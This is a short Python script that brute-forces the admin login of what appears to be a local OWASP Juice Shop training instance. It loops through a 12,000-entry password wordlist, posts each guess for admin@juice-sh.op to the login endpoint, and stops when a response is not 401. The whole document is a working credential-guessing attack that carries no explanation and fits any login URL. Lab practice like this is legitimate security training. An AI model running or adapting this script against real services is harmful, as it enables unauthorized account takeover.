import requests

with open("top12000-passwords.txt", "r") as file:
	passwords =  file.readlines()

for passwd in passwords:
	passwd = passwd.strip()
	data = {"email": "admin@juice-sh.op", "password": passwd}
	response = requests.post("http://localhost:3000/rest/user/login", json=data)
	code = response.status_code
	print(f"{passwd} - {code}")
	if code != 401:
		print(f"\u001b[31m[ + ]\u001b[0m \u001b[33m PASSWORD FOUNDED\u001b[33m {passwd}")
		break
